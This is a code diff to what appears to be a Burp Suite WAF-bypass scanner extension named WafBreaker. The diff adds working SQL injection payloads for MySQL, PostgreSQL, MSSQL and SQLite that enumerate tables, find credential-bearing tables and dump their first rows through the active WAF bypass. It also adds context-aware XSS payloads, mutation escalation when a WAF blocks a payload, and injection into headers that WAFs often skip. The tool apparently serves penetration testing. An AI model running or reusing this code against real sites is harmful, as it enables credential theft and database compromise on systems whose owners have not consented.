+        # UUIDs
+        bl = re.sub(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', 'UUID', bl)
+        # Collapse whitespace so minor spacing differences don't break comparison
+        bl = re.sub(r'\s+', ' ', bl).strip()
+        return bl
+
     def _is_blocked(self, status, body):
         # Hard signal: known WAF status codes
         if status in WAF_STATUS_CODES:
@@ -3469,15 +5002,19 @@ class ScanEngine(object):
             if re.search(pat, bl):
                 return True
         # Soft signal: if response closely matches the captured blocked baseline,
-        # it's the same block page even if status/patterns differ (e.g. 200 + challenge page).
+        # it's the same block page even if status/patterns differ (e.g. 200 OK + F5 rejection page).
+        # We normalize both bodies first to strip dynamic IDs (support IDs, ray IDs, timestamps)
+        # that change on every request to the same WAF block page — without normalization, F5
+        # block pages with different support IDs would have slightly different lengths/snippets.
         if self._blocked_baseline:
-            bl_len  = self._blocked_baseline["len"]
-            cur_len = len(body)
-            if (bl_len > 50                                     # ignore empty/trivial bodies
+            norm_cur = self._normalize_body_for_baseline(body)
+            bl_len   = self._blocked_baseline["norm_len"]
+            cur_len  = len(norm_cur)
+            if (bl_len > 50
                     and self._blocked_baseline["status"] == status
                     and bl_len > 0
                     and abs(cur_len - bl_len) / float(bl_len) < 0.05):
-                if body[:120].lower() == self._blocked_baseline["snippet"][:120]:
+                if norm_cur[:120] == self._blocked_baseline["norm_snippet"][:120]:
                     return True
         return False
 
@@ -3491,8 +5028,12 @@ class ScanEngine(object):
         """
         if self._blocked_baseline is None:
             return "Firm"
-        bl_len  = self._blocked_baseline["len"]
-        cur_len = len(body)
+        # Use normalized lengths to avoid F5 BIG-IP ASM support-ID drift
+        # inflating delta and producing spurious "Certain" readings when both
+        # responses are actually the same block page with different numeric IDs.
+        bl_len  = self._blocked_baseline.get("norm_len") or self._blocked_baseline["len"]
+        norm_cur = self._normalize_body_for_baseline(body)
+        cur_len  = len(norm_cur)
         if status != self._blocked_baseline["status"]:
             return "Certain"
         if bl_len > 0:
@@ -3926,6 +5467,10 @@ class ScanEngine(object):
             self._log("[POC] Trying stacked-query dump...")
             results.update(self._phase_sqli_poc_stacked())
 
+        # ── Technique 6: Table / column enumeration (after any version hit) ───
+        self._log("[POC] Attempting table enumeration...")
+        results.update(self._phase_sqli_poc_tables())
+
         return results
 
     # ─────────────────────────────────────────────────────────────────────────
@@ -4105,6 +5650,116 @@ class ScanEngine(object):
                     break   # one confirmation is enough
         except Exception as ex:
             self._log("[POC-TIME] Error: %s" % str(ex))
+        return results
+
+    # ─────────────────────────────────────────────────────────────────────────
+    #   Table / column enumeration POC — runs after version confirmed
+    #   Tries to list tables from information_schema / sys.tables / sqlite_master
+    #   then looks for high-value tables and dumps first-row credentials.
+    # ─────────────────────────────────────────────────────────────────────────
+    def _phase_sqli_poc_tables(self):
+        """
+        POC: enumerate table names and look for juicy ones.
+        All probes go through the active bypass so WAF-bypass stays in focus.
+        Returns dict: {label: (payload, result)}
+        """
+        results = {}
+        _interesting = ["user", "users", "admin", "account", "accounts",
+                        "member", "password", "passwd", "credential",
+                        "login", "auth", "customer", "employee"]
+
+        # ── 1. Table enumeration payloads per DB ──────────────────────────────
+        _table_probes = [
+            # MySQL / MariaDB — error-based table list
+            ("mysql_tables_err",
+             "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
+             "FROM information_schema.tables WHERE table_schema=database() LIMIT 5),0x7e))-- -",
+             r"~([^~]+)~"),
+            # MySQL — UNION-based (2 cols)
+            ("mysql_tables_union",
+             "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),NULL "
+             "FROM information_schema.tables WHERE table_schema=database() LIMIT 5-- -",
+             r"([a-z_]{3,}(?:,[a-z_]{3,})+)"),
+            # PostgreSQL — CAST error
+            ("pgsql_tables_err",
+             "' AND 1=CAST((SELECT string_agg(table_name,',') "
+             "FROM information_schema.tables WHERE table_schema='public') AS INTEGER)-- -",
+             r'integer: "([^"]+)"'),
+            # MSSQL — CONVERT error
+            ("mssql_tables_err",
+             "' AND 1=CONVERT(INT,(SELECT TOP 5 name FROM sys.tables FOR XML PATH('')))-- -",
+             r"nvarchar value '([^']+)'"),
+            # SQLite
+            ("sqlite_tables_err",
+             "' AND 1=CAST((SELECT group_concat(tbl_name,',') FROM sqlite_master WHERE type='table') AS INTEGER)-- -",
+             r"could not convert.*?\"([^\"]+)\""),
+        ]
+
+        found_tables = []
+        for label, payload, pat in _table_probes:
+            try:
+                kw = {}
+                pp, pkw = self._apply_bypass(payload, kw)
+                req = self._build_request(pp, **pkw)
+                s, b = self._send(req)
+                oc = self._outcome(s, b)
+                self._report("[POC-TABLES] %s" % label, payload, s, b, oc)
+                m = re.search(pat, b, re.IGNORECASE)
+                if m:
+                    tables_raw = m.group(1)
+                    found_tables = [t.strip() for t in tables_raw.split(",") if t.strip()]
+                    results["tables_%s" % label] = (payload, tables_raw[:300])
+                    self._log("[POC-TABLES] %s: %s" % (label, tables_raw[:100]))
+                    break
+            except Exception:
+                pass
+
+        # ── 2. Column / credential dump from interesting tables ───────────────
+        if found_tables:
+            for tbl in found_tables:
+                if any(k in tbl.lower() for k in _interesting):
+                    # Try to extract columns
+                    col_probe = (
+                        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) "
+                        "FROM information_schema.columns WHERE table_name='%s'),0x7e))-- -" % tbl
+                    )
+                    col_union = (
+                        "' UNION SELECT GROUP_CONCAT(column_name),NULL "
+                        "FROM information_schema.columns WHERE table_name='%s'-- -" % tbl
+                    )
+                    for clabel, cp in [("err", col_probe), ("union", col_union)]:
+                        try:
+                            kw = {}
+                            pp, pkw = self._apply_bypass(cp, kw)
+                            req = self._build_request(pp, **pkw)
+                            s, b = self._send(req)
+                            oc = self._outcome(s, b)
+                            self._report("[POC-COLS] %s/%s" % (tbl, clabel), cp, s, b, oc)
+                            m = re.search(r"~([^~]+)~|integer: \"([^\"]+)\"|nvarchar value '([^']+)'",
+                                          b, re.IGNORECASE)
+                            if m:
+                                cols_raw = next(g for g in m.groups() if g)
+                                results["columns_%s" % tbl] = (cp, cols_raw[:300])
+                                self._log("[POC-COLS] %s columns: %s" % (tbl, cols_raw[:80]))
+                                # Try first-row dump
+                                cols = [c.strip() for c in cols_raw.split(",")]
+                                dump_cols = ",".join(cols[:3])
+                                dump_probe = (
+                                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT_WS('::%7e',%s) "
+                                    "FROM %s LIMIT 1),0x7e))-- -" % (dump_cols, tbl)
+                                )
+                                kw2 = {}
+                                pp2, pkw2 = self._apply_bypass(dump_probe, kw2)
+                                req2 = self._build_request(pp2, **pkw2)
+                                s2, b2 = self._send(req2)
+                                dm = re.search(r"~([^~]+)~", b2, re.IGNORECASE)
+                                if dm:
+                                    results["dump_%s" % tbl] = (dump_probe, dm.group(1)[:300])
+                                    self._log("[POC-DUMP] %s first row: %s" % (tbl, dm.group(1)[:80]))
+                                break
+                        except Exception:
+                            pass
+
         return results
 
     # ─────────────────────────────────────────────────────────────────────────
@@ -4344,11 +5999,19 @@ class ScanEngine(object):
             self._log("[!] WAF detected (HTTP %d).  Engaging bypass phase..." % status)
             self._waf_found = True
 
-            # Capture blocked-response fingerprint for adaptive _is_blocked() scoring
+            # Capture blocked-response fingerprint for adaptive _is_blocked() scoring.
+            # We store BOTH raw and normalized forms:
+            #   "norm_len" / "norm_snippet" — used for soft-matching; dynamic IDs
+            #   (F5 support IDs, Cloudflare ray IDs, UUIDs) are stripped first so that
+            #   two block responses that differ only in their per-request numeric ID
+            #   are still recognized as the same WAF block page.
+            _norm_body = self._normalize_body_for_baseline(body)
             self._blocked_baseline = {
-                "len":     len(body),
-                "status":  status,
-                "snippet": body[:200].lower(),
+                "len":          len(body),
+                "norm_len":     len(_norm_body),
+                "status":       status,
+                "snippet":      body[:200].lower(),
+                "norm_snippet": _norm_body[:200],
             }
 
             # Identify which WAF vendor we're dealing with
@@ -4385,6 +6048,9 @@ class ScanEngine(object):
 
         # ── Phase 3: Full payload sweep ───────────────────────────────────────
         self._phase_payloads()
+
+        # ── Phase 3.2: Header injection (bypass WAFs that ignore headers) ─────
+        self._phase_header_injection()
 
         # ── Phase 3.5: Blind XSS (OOB via Burp Collaborator) ─────────────────
         if self._vtype == "XSS":
@@ -5107,10 +6773,75 @@ class ScanEngine(object):
             payload = tamper_json_inline(payload)
         return payload, kwargs
 
+    def _detect_xss_context(self, probe_marker="ENIMARKER7x7"):
+        """
+        Send a unique marker to the endpoint and inspect where it appears
+        in the response to determine the injection context.
+        Returns one of: 'html_body', 'html_attr', 'js_string', 'js_block', 'url', 'unknown'
+        """
+        try:
+            req = self._build_request(probe_marker)
+            s, b = self._send(req)
+            if probe_marker not in b:
+                return "unknown"
+            idx = b.find(probe_marker)
+            before = b[max(0, idx-100):idx]
+            after  = b[idx+len(probe_marker):idx+len(probe_marker)+80]
+            # JS string context: marker inside quotes within a script block
+            if re.search(r"<script[^>]*>.*$", before, re.IGNORECASE | re.DOTALL):
+                if re.search(r"""['"][^'"]*$""", before):
+                    return "js_string"
+                return "js_block"
+            # HTML attribute: marker between attribute quotes
+            if re.search(r"""[a-zA-Z_-]+=(['"])[^'"]*$""", before):
+                return "html_attr"
+            # URL attribute: marker in href/src/action
+            if re.search(r"""(href|src|action|data)=['"']?[^'"]*$""", before, re.IGNORECASE):
+                return "url"
+            return "html_body"
+        except Exception:
+            return "unknown"
+
+    # Context-specific best payloads per reflection context
+    _XSS_CONTEXT_PAYLOADS = {
+        "html_body":  [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert(1)>",
+        ],
+        "html_attr":  [
+            "\" onmouseover=\"alert(1)\"",
+            "' onmouseover='alert(1)'",
+            "\" autofocus onfocus=\"alert(1)\"",
+        ],
+        "js_string":  [
+            "';alert(1)//",
+            "\";alert(1)//",
+            "\\';alert(1)//",
+        ],
+        "js_block":   [
+            "alert(1)",
+            "</script><script>alert(1)</script>",
+        ],
+        "url":        [
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+        ],
+    }
+
     def _phase_payloads(self):
         payloads  = PAYLOADS[self._vtype]
         self._log("[Phase 3]  %d payloads queued..." % len(payloads))
         sqli_confirmed = False   # fire DB fingerprint only once per scan
+
+        # XSS context detection: check where our marker lands before spraying
+        if self._vtype == "XSS":
+            ctx = self._detect_xss_context()
+            self._log("[Phase 3]  XSS reflection context: %s" % ctx)
+            ctx_payloads = self._XSS_CONTEXT_PAYLOADS.get(ctx, [])
+            if ctx_payloads:
+                payloads = ctx_payloads + [p for p in payloads if p not in ctx_payloads]
+                self._log("[Phase 3]  Re-prioritised %d context-specific payloads first" % len(ctx_payloads))
 
         for idx, payload in enumerate(payloads, 1):
             self._log("[%d/%d] %s" % (idx, len(payloads), payload[:70]))
@@ -5163,6 +6894,61 @@ class ScanEngine(object):
                     ev.append(payload)
                     self._log("[+] Additional %s payload confirmed (no new issue): %s"
                               % (self._vtype, payload[:80]))
+
+            # ── Systematic mutation escalation when WAF blocks base payload ──────
+            if oc == "BLOCKED":
+                mutations = _get_systematic_mutations(self._vtype, p)
+                if mutations:
+                    self._log("[MUT] Base blocked — escalating through %d systematic mutations..."
+                              % len(mutations))
+                for mutated_p, tier_label in mutations:
+                    kwargs_m  = {}
+                    mp, mkw   = self._apply_bypass(mutated_p, kwargs_m)
+                    req_m     = self._build_request(mp, **mkw)
+                    s_m, b_m  = self._send(req_m)
+                    oc_m      = self._outcome(s_m, b_m)
+                    self._report("[MUT/%s]" % tier_label, mutated_p, s_m, b_m, oc_m)
+
+                    if oc_m == "VULN!":
+                        self._log("[+] Mutation confirmed VULN: %s → %s"
+                                  % (tier_label, mutated_p[:60]))
+                        # Re-use normal VULN handling — synthetic payload label
+                        bypass_desc = (
+                            self._bypass.get("name", self._bypass["type"])
+                            if self._bypass else "mutation-only"
+                        ) + " + mutation(%s)" % tier_label
+                        if self._vtype == "SQL Injection":
+                            self._sqli_confirm_and_poc(
+                                break_payload  = mutated_p,
+                                break_label    = "systematic mutation (%s)" % tier_label,
+                                repair_payload = mutated_p,
+                                repair_label   = "mutation VULN",
+                                db_variant     = None,
+                                bool_confirmed = False,
+                                source         = "Phase 3 Mutation (%s)" % tier_label,
+                                extra_payload  = mutated_p,
+                                bypass_desc    = bypass_desc,
+                            )
+                        elif self._vtype not in self._issued_high:
+                            self._issued_high.add(self._vtype)
+                            self._add_issue(
+                                "%s via Systematic Mutation Bypass" % self._vtype,
+                                "WafBreaker found a <b>%s</b> vulnerability using the "
+                                "systematic mutation engine.<br><br>"
+                                "Base payload <code>%s</code> was blocked (WAF rule matched).<br>"
+                                "Mutation <b>%s</b> bypassed the rule:<br>"
+                                "<code>%s</code><br><br>"
+                                "This confirms the WAF rule is bypassable via this "
+                                "semantic/syntactic variant."
+                                % (self._vtype, payload[:200], tier_label, mutated_p[:300]),
+                                severity="High",
+                                confidence="Certain",
+                            )
+                        break  # stop mutating once one works
+                    elif oc_m != "BLOCKED":
+                        # Passed WAF but no VULN pattern — possible blind vuln
+                        self._log("[~] Mutation passed WAF (no pattern hit): %s" % tier_label)
+                        # Continue looking for VULN confirmation
 
             # ── Smart SQLi DB fingerprinting ──────────────────────────────────
             # When a bypass-style SQLi payload passes for the first time →
@@ -5306,6 +7092,88 @@ class ScanEngine(object):
                         return   # one working chain per canary is enough
 
         self._log("[Phase 3.8 complete]")
+
+    # ═════════════════════════════════════════════════════════════════════════
+    #   PHASE 3.2 — HEADER INJECTION
+    #   WAF bypass via untested attack surface: inject the current vtype probe
+    #   into HTTP headers that most WAFs skip inspection for.
+    #   Targets: User-Agent, Referer, X-Forwarded-For, X-Real-IP,
+    #            X-Original-URL, X-Rewrite-URL, CF-Connecting-IP,
+    #            X-Forwarded-Host, Via, X-Custom-IP-Authorization
+    # ═════════════════════════════════════════════════════════════════════════
+    def _phase_header_injection(self):
+        self._log("[3.2] Header injection — testing headers as injection surface...")
+
+        probe = INITIAL_PROBES.get(self._vtype, "")
+        if not probe:
+            return
+
+        # Headers with description — sorted by how often WAFs ignore them
+        _target_headers = [
+            # WAFs almost universally skip these (IP trust headers)
+            "X-Forwarded-For",
+            "X-Real-IP",
+            "CF-Connecting-IP",
+            "X-Client-IP",
+            "True-Client-IP",
+            "X-Custom-IP-Authorization",
+            "X-Originating-IP",
+            # Path rewrite headers — often logged/processed by app, not WAF
+            "X-Original-URL",
+            "X-Rewrite-URL",
+            "X-Forwarded-Path",
+            # Proxy / forwarding headers
+            "Via",
+            "Forwarded",
+            "X-Forwarded-Host",
+            "X-Host",
+            "X-Forwarded-Server",
+            # Common app-layer headers that reach backend logic
+            "User-Agent",
+            "Referer",
+            "Origin",
+        ]
+
+        found_in_header = []
+
+        for hdr in _target_headers:
+            try:
+                # Build a request where the injection goes into the header
+                # Use the base request + bypass applied on top of header value
+                kw = {}
+                pp, pkw = self._apply_bypass(probe, kw)
+                extra_hdrs = pkw.get("extra_headers", [])
+                # Inject into this specific header (add/override)
+                hdr_injection = ["%s: %s" % (hdr, pp)] + extra_hdrs
+                req = self._build_request(
+                    "1",  # benign param value
+                    extra_headers=hdr_injection,
+                )
+                s, b = self._send(req)
+                oc = self._outcome(s, b)
+                self._report("[HdrInject] %s" % hdr, probe, s, b, oc)
+
+                if oc == "VULN!":
+                    found_in_header.append(hdr)
+                    self._log("[+] Header injection confirmed in: %s" % hdr)
+            except Exception:
+                pass
+
+        if found_in_header:
+            self._add_issue(
+                "Header Injection — %s via Uninspected Headers" % self._vtype,
+                "The WAF did not inspect HTTP header values. The probe "
+                "<code>%s</code> triggered a vulnerable response when injected "
+                "into the following headers:<br><br><b>%s</b><br><br>"
+                "Many WAFs only inspect URL parameters and POST body, leaving "
+                "these headers as a reliable bypass surface. Critical for SQLi, "
+                "XSS, CMDi, and SSRF where the backend trusts forwarded values "
+                "(e.g., logging User-Agent to DB, trusting X-Forwarded-For as "
+                "IP source for auth bypass)."
+                % (probe, ", ".join(found_in_header)),
+                severity="High",
+                confidence="Certain",
+            )
 
     # ═════════════════════════════════════════════════════════════════════════
     #   PHASE 3.5 — BLIND XSS (Out-of-Band via Burp Collaborator)
